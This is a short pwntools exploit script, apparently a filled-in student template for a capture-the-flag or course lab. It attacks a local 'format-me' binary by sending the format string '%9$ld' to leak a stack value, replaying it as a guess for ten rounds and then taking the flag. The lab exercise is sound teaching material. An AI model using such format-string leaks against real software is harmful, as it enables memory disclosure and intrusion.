#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./format-me")

r = process([exe.path])
# r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line

for i in range(10):
    # Add your code Here
    r.recvuntil(b"Recipient? ") # Think about what should be received first?
    r.sendline(b"%9$ld") # Add your format string code here!
    
    leak = r.recvline()
    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
    val = leak.strip() # you need to fill in idx_1, and idx_2 by yourself
    print(val)
    
    r.recvuntil(b"Guess? ") #Think about what should be received?
    r.sendline(val) 
    r.recvuntil(b"Correct")
    print(f"round {i}")

r.recvuntil(b"Here's your flag: ")
r.interactive()